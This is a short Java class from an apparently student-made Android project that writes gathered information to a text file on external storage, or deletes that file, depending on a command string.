package com.example.student.hatsker;


import android.content.Context;
import android.os.Environment;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;


public class FileManager {

    File tempFile;
    File path = Environment.getExternalStorageDirectory();


    private final String DELETE = "detete";
    private final String REWRITE = "rewrite";

    public FileManager(String cmd, Context context)
    {
        switch(cmd)
        {
            case DELETE: delete();
                break;
            case REWRITE: rewrite(new GathererBuilder().build(cmd, context).getInfo());
                break;
        }
    }

    public void rewrite(String string){

        tempFile = new File(path + "/" + "textffile.txt");

        FileWriter writer;
        try {

            writer = new java.io.FileWriter(tempFile);
            writer.write(string);
            writer.close();

        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    public void delete()
    {
        tempFile = new File(path + "/" + "textffile.txt");
        tempFile.delete();
    }


}
